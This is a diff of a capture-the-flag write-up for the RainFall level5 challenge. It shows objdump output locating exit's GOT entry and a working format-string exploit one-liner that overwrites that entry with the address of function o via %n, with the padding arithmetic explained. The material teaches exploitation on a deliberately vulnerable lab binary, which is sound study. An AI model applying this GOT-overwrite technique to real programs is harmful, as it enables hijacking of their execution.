@@ -1,4 +1,19 @@
-(python -c 'print("\x38\x98\x04\x08" + "%x"*2 +  "%134513812x" + "%n" )'; cat) | ./level5
-objdump -d ./level5
+We replace the address of exit by the address of o function
 
-address jmp exit
+Address of o -> 0x80484a4 (134513828)
+
+```
+level5@RainFall:~$ objdump -d ./level5 | grep 'exit@plt' -A 1 | grep jmp
+8048390:	ff 25 28 98 04 08    	jmp    *0x8049828
+80483d0:	ff 25 38 98 04 08    	jmp    *0x8049838
+```
+
+(python -c 'print("\x38\x98\x04\x08" + "%c"*2 +  "%134513822x" + "%n" )'; cat) | ./level5
+
+Explanation:
+
+          4 -> "\x38\x98\x04\x08" address where we write the value
++         2 -> '%c'*2 skip 2 arguments
++ 134513822 -> 3rd argument with padding
+------------
+  134513828
